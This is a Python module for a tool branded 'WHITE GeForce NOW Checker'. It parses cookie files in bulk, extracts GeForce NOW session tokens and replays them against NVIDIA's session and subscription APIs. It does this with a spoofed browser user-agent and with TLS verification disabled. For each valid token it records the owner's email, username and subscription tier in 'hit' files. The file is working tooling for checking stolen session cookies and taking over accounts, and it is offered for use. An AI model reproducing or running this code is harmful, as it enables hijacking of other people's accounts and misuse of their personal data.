"""
GeForce NOW (GFN) Cookie Checker
GFNJWT session validation + real subscription plan check (Free / Priority / Ultimate)
"""
import re
import json
import base64
import requests
from datetime import datetime
from typing import Dict, List, Tuple, Optional

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

GFN_SESSION_URL = "https://prod.cloudmatchbeta.nvidiagrid.net/v2/session"
GFN_SUBS_URL = "https://mes.geforcenow.com/v4/subscriptions"
GFN_SKU_NAMES = {"1000": "Free", "2000": "Priority", "3000": "Ultimate",
                 "100": "Free", "101": "Priority", "102": "Ultimate"}
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+")
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")


def _parse_cookies(text: str) -> Dict[str, str]:
    """Parse Netscape / key=value cookie text."""
    out = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            out[parts[5]] = parts[6]
        elif '=' in line:
            for seg in line.split(';'):
                if '=' in seg:
                    k, v = seg.split('=', 1)
                    out[k.strip()] = v.strip()
    return out


def _decode_jwt(token: str) -> dict:
    try:
        part = str(token).split('.')[1]
        part += '=' * (-len(part) % 4)
        return json.loads(base64.urlsafe_b64decode(part))
    except Exception:
        return {}


def _find_jwt(cookies_dict: dict) -> Optional[str]:
    for k, v in cookies_dict.items():
        if k.upper() in ("GFNJWT", "GFN_JWT"):
            return str(v).strip()
    m = JWT_RE.search(" ".join(str(v) for v in cookies_dict.values()))
    return m.group(0) if m else None


def is_valid_gfn(cookies_dict: dict) -> bool:
    if any(k in cookies_dict for k in ("GFNJWT", "gfnjwt", "gfn_jwt")):
        return True
    return bool(JWT_RE.search(" ".join(str(v) for v in cookies_dict.values())))


def count_valid_gfn(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_gfn(d):
            result.append((src, d))
    return len(result), result


def check_gfn_cookie(cookies_dict: dict, proxies_list: List[str] = None) -> Tuple[Optional[dict], str]:
    """Check GFN cookie — session validate + real plan (Free/Priority/Ultimate) + expiry."""
    try:
        jwt = _find_jwt(cookies_dict)
        if not jwt:
            return None, 'invalid'

        session = requests.Session()
        headers = {
            "User-Agent": UA,
            "Accept": "application/json, text/plain, */*",
            "Authorization": f"GFNJWT {jwt}",
            "Origin": "https://play.geforcenow.com",
            "Referer": "https://play.geforcenow.com/",
        }

        try:
            r = session.get(GFN_SESSION_URL, headers=headers, timeout=(10, 25), verify=False)
        except Exception:
            return None, 'error'

        if r.status_code == 401:
            return None, 'expired'
        if r.status_code != 200:
            return None, 'error'

        payload = _decode_jwt(jwt)
        username = payload.get("preferred_username") or ""
        email = payload.get("email") or ""
        profile = f"{username} ({email})" if username and email else (username or email or str(payload.get("sub", "N/A")))

        expiry = ""
        if payload.get("exp"):
            expiry = datetime.utcfromtimestamp(payload["exp"]).strftime("%Y-%m-%d %H:%M UTC")

        # Real subscription check via NVIDIA subscriptions API
        plan, is_premium = "Unknown", None
        uid = payload.get("sub")
        if uid:
            try:
                sr = session.get(
                    GFN_SUBS_URL,
                    params={"serviceName": "gfn_pc", "languageCode": "en_US",
                            "vpcId": "NP-ASH-04", "userId": uid},
                    headers=headers, timeout=(10, 25), verify=False)
                if sr.status_code == 200:
                    subs = sr.json()
                    if isinstance(subs, list) and subs:
                        subs = subs[0]
                    sku = str(subs.get("productSku", ""))
                    plan = GFN_SKU_NAMES.get(sku, f"Paid (SKU {sku})" if sku and sku != "1000" else "Unknown")
                    is_premium = sku not in ("", "1000", "100")
                    if subs.get("endDateTime"):
                        expiry = str(subs["endDateTime"])[:19].replace("T", " ") + " UTC"
            except Exception:
                pass

        return {
            "profile": profile,
            "email": email or "N/A",
            "username": username or "N/A",
            "plan": plan,
            "is_premium": bool(is_premium),
            "expiry": expiry or "N/A",
        }, 'valid'
    except Exception:
        return None, 'error'


def format_hit_gfn(result: dict, cookies_dict: dict, source: str) -> Tuple[str, str]:
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    premium = 'Yes' if result.get('is_premium') else 'No'
    content = f"""════════════════════════════════════════════════════════
  WHITE GeForce NOW Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

  Profile    : {result.get('profile', 'N/A')}
  Plan       : {result.get('plan', 'N/A')}
  Premium    : {premium}
  Expiry     : {result.get('expiry', 'N/A')}

════════════════════════════════════════════════════════
"""
    safe_plan = re.sub(r'[<>:"/\|?*\s]', '_', str(result.get('plan', 'unknown')).lower())
    safe_name = re.sub(r'[<>:"/\|?*\s]', '_', str(result.get('username') or result.get('profile', 'unknown'))[:40])
    return content, f"[{safe_plan}][{safe_name}].txt"
